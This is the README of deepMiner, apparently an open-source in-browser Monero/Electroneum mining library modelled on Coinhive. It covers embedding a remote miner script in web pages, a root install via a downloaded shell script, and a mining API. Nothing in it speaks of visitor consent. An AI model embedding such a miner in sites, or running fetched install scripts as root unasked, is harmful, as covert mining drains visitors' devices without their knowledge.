# deepMiner

![](https://raw.githubusercontent.com/deepwn/deepMiner/master/.github/banner.png)

* deepMiner (idea like coinhive.js) By evil7@deePwn
* Working on XMR(Monero) and ETN(Electroneum) personal wallet
* Eazy way mining in browsers & Nice payback than Ad-inject

## Support on

![](https://raw.githubusercontent.com/deepwn/deepMiner/master/.github/xmr.png) ![](https://raw.githubusercontent.com/deepwn/deepMiner/master/.github/etn.png)![](https://raw.githubusercontent.com/deepwn/deepMiner/master/.github/sumokoin.png)

* And All coins who follow `cryptoNight` / `cryptoNight v7` && pool connect in `JSONRPC2`
* Some coins used cryptoNote <https://cryptonote.org/coins/> (example: Monero / Electroneum /Sumokoin / Aeon ...)
* The whitebook: `cryptoNight.txt` and `cryptoNight.md`. Come from: <https://cryptonote.org/standards/>
* Technology: <https://cryptonote.org/inside/>

## Usage

Add some javascript and write like this :

```html
<script src="https://deepool.net/lib/deepMiner.min.js"></script>
<script>
    var miner = new deepMiner.Init('Site_Name');
    miner.start();
</script>
```

## Install

```bash
curl https://raw.githubusercontent.com/deepwn/deepMiner/master/install.sh > install.sh
sudo sh install.sh
```

lib request: `*nodejs` / `*npm` / `?nginx`

useful pakages: `forever`

ssl support: <https://certbot.eff.org/>

OS pass: `ubuntu(debian)`

## API Document

You can use events in your page, to handling the HTML with mining status.

```
<script>
    // Listen on events
    miner.on('found', function() { /* Hash found */ })
    miner.on('accepted', function() { /* Hash accepted */ })

    // Update stats once per second
    setInterval(function() {
        var hashesPerSecond = miner.getHashesPerSecond();
        var totalHashes = miner.getTotalHashes();
        var acceptedHashes = miner.getAcceptedHashes();
        console.table({
            "hashesPerSecond":hashesPerSecond,
            "totalHashes":totalHashes,
            "acceptedHashes":acceptedHashes});

        // Output to HTML elements...

    }, 1000);
</script>
```
**new deepMiner.Init( [site, options] )**

site : New a miner, that you can add a siteID / nameID or some string for Identify.

options : threads / throttle / forceASMJS

E.g.:

```
var miner = new deepMiner.Init(document.location, {
    autoThreads: true
});
miner.start();
```

**.start( [mode] )**

mode: deepMiner.IF_EXCLUSIVE_TAB / deepMiner.FORCE_EXCLUSIVE_TAB / deepMiner.FORCE_MULTI_TAB

E.g.:

```
miner.start(deepMiner.IF_EXCLUSIVE_TAB);
```

**.stop( )**

Stop mining and disconnect from the pool.

**.isRunning( )**

Returns true|false whether the miner is currently running: connected to the pool and has working threads.

**.isMobile( )**

Returns true|false whether the user is using a phone or tablet device. You can use this to only start the miner on laptops and PCs.

**.hasWASMSupport( )**

Returns true|false whether the Browser supports WebAssembly. If WASM is not supported, the miner will automatically use the slower asm.js version. Consider displaying a warning message to the user to update their browser.

**.getNumThreads( )**

Returns the current number of threads. Note that this will report the configured number of threads, even if the miner is not yet started.

**.setNumThreads( numThreads )**

Set the desired number of threads. Min: 1. Typically you shouldn't go any higher than maybe 8 or 16 threads even if your users have all new AMD Threadripper CPUs.

**.getThrottle( )**

Returns the current throttle value.

**.setThrottle( throttle )**

Set the fraction of time that threads should be idle. A value of 0 means no throttling (i.e. full speed), a value of 0.5 means that threads will stay idle 50% of the time, with 0.8 they will stay idle 80% of the time.

**.getHashesPerSecond( )**

Returns the total number of hashes per second for all threads combined. Note that each thread typically updates this only once per second.

**.getTotalHashes( [interpolate] )**

Returns the total number of hashes this miner has solved. Note that this number is typically updated only once per second.

**.getAcceptedHashes( )**

Returns the number of hashes that have been accepted by the pool. Also see the accepted event.

**.on( event, callback(params) { } )**

Specify a callback for an event.

| event | description |
| :---: | :--- |
|optin|The user took action on the opt-in screen (AuthedMine only). The params.status is either "accepted" or "canceled". See below for an example.|
|open|The connection to our mining pool was opened. Usually happens shortly after `miner.start()` was called.|
|authed|The miner successfully authed with the mining pool and the siteKey was verified. Usually happens right after open. In case the miner was constructed with CoinHive.Token, a token name was received from the pool.|
|close|The connection to the pool was closed. Usually happens when `miner.stop()` was called or the CoinHive.Token miner reached its goal.|
|error|An error occured. In case of a connection error, the miner will automatically try to reconnect to the pool.|
|job|A new mining job was received from the pool.|
|found|A hash meeting the pool's was found and will be send to the pool.|
|accepted|A hash that was sent to the pool was accepted.|

## WASM building

We can see it's updated for v7 now. All sources in folder `cryptonight-wasm`.

You need install [Emscripten](https://github.com/kripken/emscripten) first, and run `./build.sh` to make this wasm file up.

the `build.sh` will help you build it and copy the new one to `./web/lib`.

## How to Update

Just cd to `/srv/deepMiner` run `git pull`

Don't forget backup your `config.json` at first.

## Attention

Some VPS's can't find pool's IP. change your VPS's DNS will work.

SSL cert request default is `TRUE`. So use `certbot` or `acme.sh` to quick set.

Choice another pool which you wanna using: <https://github.com/timekelp/xmr-pool-choice>

## License

MIT <https://raw.githubusercontent.com/deepwn/deepMiner/master/LICENSE>

## Donate (Like this project <3)

| Coin | Address |
| :---: | :--- |
| BTC | `1HNkaBbCWcye6uZiUZFzk5aNYdAKWa5Pj9` |
| XMR | `41ynfGBUDbGJYYzz2jgSPG5mHrHJL4iMXEKh9EX6RfEiM9JuqHP66vuS2tRjYehJ3eRSt7FfoTdeVBfbvZ7Tesu1LKxioRU` |
